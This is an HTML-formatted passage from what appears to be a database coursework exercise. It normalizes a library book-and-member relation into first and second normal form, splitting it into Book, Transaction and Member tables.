line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">4<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n</tbody></table><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><u><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Questions:</span></u></b></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">1.Eliminate\r\nthe redundancy from the above table.</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:\r\n107%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-fareast-font-family:Calibri;\r\nmso-fareast-theme-font:minor-latin;mso-ansi-language:EN-IN;mso-fareast-language:\r\nEN-US;mso-bidi-language:AR-SA\">2.Eliminate Data manipulation anomalies and Data\r\nInconsistency from the above table.</span></p><p class=\"MsoListParagraph\" style=\"text-align: left; margin-left: 0in; line-height: 150%;\"><b><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Solution:<o:p></o:p></span></b></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span lang=\"EN-IN\" style=\"font-size:\r\n12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Normalization\r\neliminates duplicates and data manipulation anomalies from data base.<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">Relation R </span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:Wingdings;\r\nmso-ascii-font-family:&quot;Times New Roman&quot;;mso-hansi-font-family:&quot;Times New Roman&quot;;\r\nmso-bidi-font-family:&quot;Times New Roman&quot;;color:gray;mso-themecolor:background1;\r\nmso-themeshade:128;mso-char-type:symbol;mso-symbol-font-family:Wingdings\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"> Book_id, Title,\r\nPrice, Member_id, Member_ Name, Member_type and <o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\">\r\n\r\n\r\n\r\n\r\n\r\n</p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">Entailment</span></i></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"><o:p></o:p></span></i></p><div style=\"text-align: left;\"><p class=\"MsoNormal\" style=\"line-height:150%\"><b><u><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">1<sup>st</sup> Normal Form<o:p></o:p></span></u></b></p>\r\n\r\n<p class=\"Default\"><span style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">A relation\r\nR is said to be in the first normal form (1 NF) if and only if all the\r\nattributes of the relation are atomic in nature. <o:p></o:p></span></p>\r\n\r\n<p class=\"Default\"><span style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span><span style=\"text-indent: -0.25in; font-family: Symbol;\">·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">There\r\nare no multi value attributes</span></p><p class=\"Default\"><span style=\"text-indent: -0.25in; font-family: Symbol;\">&nbsp;·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">There\r\nis a repeating group in Relation R, so split the table into two as below.</span></p><p class=\"MsoNormal\" style=\"line-height:150%\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">R1 </span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:Wingdings;\r\nmso-ascii-font-family:&quot;Times New Roman&quot;;mso-hansi-font-family:&quot;Times New Roman&quot;;\r\nmso-bidi-font-family:&quot;Times New Roman&quot;;color:gray;mso-themecolor:background1;\r\nmso-themeshade:128;mso-char-type:symbol;mso-symbol-font-family:Wingdings\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"> Book_id, Member_id,\r\nTitle and Price<o:p></o:p></span></i></p><p class=\"Default\">\r\n\r\n</p><p class=\"MsoNormal\" style=\"line-height:150%\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">R2 </span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:Wingdings;\r\nmso-ascii-font-family:&quot;Times New Roman&quot;;mso-hansi-font-family:&quot;Times New Roman&quot;;\r\nmso-bidi-font-family:&quot;Times New Roman&quot;;color:gray;mso-themecolor:background1;\r\nmso-themeshade:128;mso-char-type:symbol;mso-symbol-font-family:Wingdings\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">Member_id, Member_\r\nFirst_Name, Member_ Last_Name, Member_type and Entailment</span></i></p><p class=\"MsoNormal\" style=\"line-height:150%\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"><o:p></o:p></span></i></p></div><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\"><tbody></tbody></table></div><div align=\"center\"><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><u><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">2<sup>nd</sup> Normal Form<o:p></o:p></span></u></b></p>\r\n\r\n<p class=\"Default\" style=\"text-align: left; \"><span style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">A relation\r\nR is said to be in the second normal form (2 NF) if and only ifit is in the\r\nfirst normal form and no partial dependency exists between non-key attributes\r\nand key attributes.&nbsp;</span></p><p class=\"Default\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-family: Symbol;\">·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">There\r\nis transitive dependency in Relation R2, so split it into two as below.</span></p><p class=\"MsoNormal\" style=\"text-align: left; margin: 12pt 0in 0.0001pt; line-height: 150%;\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">R11 </span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:Wingdings;\r\nmso-ascii-font-family:&quot;Times New Roman&quot;;mso-hansi-font-family:&quot;Times New Roman&quot;;\r\nmso-bidi-font-family:&quot;Times New Roman&quot;;color:gray;mso-themecolor:background1;\r\nmso-themeshade:128;mso-char-type:symbol;mso-symbol-font-family:Wingdings\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"> Book_id, Title and\r\nPrice<o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"text-align: left; margin-bottom: 0.0001pt; line-height: 150%;\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;;color:gray;mso-themecolor:background1;mso-themeshade:\r\n128\">R12 </span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:\r\n150%;font-family:Wingdings;mso-ascii-font-family:&quot;Times New Roman&quot;;mso-hansi-font-family:\r\n&quot;Times New Roman&quot;;mso-bidi-font-family:&quot;Times New Roman&quot;;color:gray;mso-themecolor:\r\nbackground1;mso-themeshade:128;mso-char-type:symbol;mso-symbol-font-family:\r\nWingdings\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"> Book_id, Member_id</span></i></p><p class=\"MsoNormal\" style=\"text-align: left; margin-bottom: 0.0001pt; line-height: 150%;\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;;color:gray;mso-themecolor:background1;mso-themeshade:\r\n128\">R21 </span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:\r\n150%;font-family:Wingdings;mso-ascii-font-family:&quot;Times New Roman&quot;;mso-hansi-font-family:\r\n&quot;Times New Roman&quot;;mso-bidi-font-family:&quot;Times New Roman&quot;;color:gray;mso-themecolor:\r\nbackground1;mso-themeshade:128;mso-char-type:symbol;mso-symbol-font-family:\r\nWingdings\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">Member_id, Member_\r\nName, Member_ Last_Name and Member_type</span></i></p><p class=\"MsoNormal\" style=\"text-align: left; margin-bottom: 0.0001pt; line-height: 150%;\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;;color:gray;mso-themecolor:background1;mso-themeshade:\r\n128\">R22 </span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:\r\n150%;font-family:Wingdings;mso-ascii-font-family:&quot;Times New Roman&quot;;mso-hansi-font-family:\r\n&quot;Times New Roman&quot;;mso-bidi-font-family:&quot;Times New Roman&quot;;color:gray;mso-themecolor:\r\nbackground1;mso-themeshade:128;mso-char-type:symbol;mso-symbol-font-family:\r\nWingdings\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">Member_type and\r\nEntailment</span></i></p><p class=\"MsoNormal\" style=\"text-align: left; margin-bottom: 0.0001pt; line-height: 150%;\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"><o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"text-align: left; margin-bottom: 0.0001pt; line-height: 150%;\"><i><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\"><o:p></o:p></span></i></p><p class=\"Default\" style=\"text-align: left; \"><span style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><o:p></o:p></span></p><div style=\"font-weight: bold; text-align: left;\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:107%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-fareast-font-family:Calibri;mso-fareast-theme-font:minor-latin;mso-ansi-language:\r\nEN-IN;mso-fareast-language:EN-US;mso-bidi-language:AR-SA\">Book&nbsp; &nbsp;</span></b></div><div style=\"font-weight: bold; text-align: left;\"><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\">\r\n <tbody><tr style=\"mso-yfti-irow:0;mso-yfti-firstrow:yes;height:31.45pt\">\r\n  <td width=\"83\" valign=\"top\" style=\"width:62.4pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:31.45pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Book_id<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"83\" valign=\"top\" style=\"width:62.4pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:31.45pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Title<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"83\" valign=\"top\" style=\"width:62.4pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:31.45pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%;tab-stops:39.75pt\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Price<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr style=\"mso-yfti-irow:1;height:8.55pt\">\r\n  <td width=\"83\" valign=\"top\" style=\"width:62.4pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:8.55pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"83\" valign=\"top\" style=\"width:62.4pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:8.55pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"83\" valign=\"top\" style=\"width:62.4pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:8.55pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%;tab-stops:39.75pt\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n </tr>\r\n <tr style=\"mso-yfti-irow:2;mso-yfti-lastrow:yes;height:8.85pt\">\r\n  <td width=\"83\" valign=\"top\" style=\"width:62.4pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:8.85pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"83\" valign=\"top\" style=\"width:62.4pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:8.85pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"83\" valign=\"top\" style=\"width:62.4pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:8.85pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%;tab-stops:39.75pt\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n </tr>\r\n</tbody></table></div><div style=\"font-weight: bold; text-align: left;\"><br></div><div style=\"font-weight: bold; text-align: left;\"><p class=\"MsoNormal\" style=\"line-height:150%\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;\">Transaction</span></b></p><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" align=\"left\" style=\"border: none; margin-left: 6.75pt; margin-right: 6.75pt;\">\r\n <tbody><tr style=\"mso-yfti-irow:0;mso-yfti-firstrow:yes;height:28.5pt\">\r\n  <td width=\"75\" valign=\"top\" style=\"width:56.0pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:28.5pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%;mso-element:frame;mso-element-frame-hspace:\r\n  9.0pt;mso-element-wrap:around;mso-element-anchor-vertical:paragraph;\r\n  mso-element-anchor-horizontal:margin;mso-element-top:19.35pt;mso-height-rule:\r\n  exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Book_id</span><span style=\"font-size:\r\n  12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-ansi-language:\r\n  EN-US\"><o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"75\" valign=\"top\" style=\"width:56.0pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:28.5pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;\r\n  mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:margin;\r\n  mso-element-top:19.35pt;mso-height-rule:exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Member_id<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr style=\"mso-yfti-irow:1;height:5.9pt\">\r\n  <td width=\"75\" valign=\"top\" style=\"width:56.0pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:5.9pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%;mso-element:frame;mso-element-frame-hspace:\r\n  9.0pt;mso-element-wrap:around;mso-element-anchor-vertical:paragraph;\r\n  mso-element-anchor-horizontal:margin;mso-element-top:19.35pt;mso-height-rule:\r\n  exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"75\" valign=\"top\" style=\"width:56.0pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:5.9pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;\r\n  mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:margin;\r\n  mso-element-top:19.35pt;mso-height-rule:exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n </tr>\r\n <tr style=\"mso-yfti-irow:2;mso-yfti-lastrow:yes;height:13.25pt\">\r\n  <td width=\"75\" valign=\"top\" style=\"width:56.0pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-top:none;mso-border-top-alt:solid black .5pt;\r\n  mso-border-top-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:13.25pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%;mso-element:frame;mso-element-frame-hspace:\r\n  9.0pt;mso-element-wrap:around;mso-element-anchor-vertical:paragraph;\r\n  mso-element-anchor-horizontal:margin;mso-element-top:19.35pt;mso-height-rule:\r\n  exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"75\" valign=\"top\" style=\"width:56.0pt;border-top:none;border-left:none;\r\n  border-bottom:solid black 1.0pt;mso-border-bottom-themecolor:text1;\r\n  border-right:solid black 1.0pt;mso-border-right-themecolor:text1;mso-border-top-alt:\r\n  solid black .5pt;mso-border-top-themecolor:text1;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:13.25pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;\r\n  mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:margin;\r\n  mso-element-top:19.35pt;mso-height-rule:exactly\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n </tr>\r\n</tbody></table><p class=\"MsoNormal\" style=\"line-height:150%\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;\"><br></span></b></p><p class=\"MsoNormal\" style=\"line-height:150%\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;\"><br></span></b></p><p class=\"MsoNormal\" style=\"line-height:150%\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;\"><br></span></b></p><p class=\"MsoNormal\" style=\"line-height:150%\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:107%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-fareast-font-family:Calibri;mso-fareast-theme-font:minor-latin;mso-ansi-language:\r\nEN-IN;mso-fareast-language:EN-US;mso-bidi-language:AR-SA\">Member</span></b></p><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" width=\"610\" style=\"width: 457.5pt; border: none;\">\r\n <tbody><tr style=\"mso-yfti-irow:0;mso-yfti-firstrow:yes;height:14.55pt\">\r\n  <td width=\"129\" valign=\"top\" style=\"width:96.55pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">Member_id<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"165\" valign=\"top\" style=\"width:123.55pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n  &quot;Times New Roman&quot;,&quot;serif&quot;\">Member_First_ Name<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"158\" valign=\"top\" style=\"width:118.7pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt;height:14.55pt\">\r\n  <p class=\"MsoNormal\" 